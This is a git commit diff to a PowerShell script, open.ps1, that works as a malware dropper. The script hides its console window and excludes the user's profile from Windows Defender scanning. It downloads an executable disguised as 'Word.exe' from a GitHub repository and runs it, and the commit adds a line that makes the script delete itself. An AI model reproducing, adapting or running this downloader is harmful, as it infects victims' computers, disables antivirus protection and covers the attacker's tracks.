99c182462e5bae644179fa09d51850f3921da1d5
MrRoyal1235 <94418680+MrRoyal1235@users.noreply.github.com>
2024-10-11 18:36:00 +0700

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -16,8 +16,10 @@ function Hide-Console
 }
 Hide-Console
 Add-MpPreference -ExclusionPath $env:USERPROFILE
+Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 $url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
 $outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
 Start-Sleep -Milliseconds 100 
 Invoke-WebRequest -Uri $url -OutFile $outputFile
 Start-Process -FilePath $outputFile
+
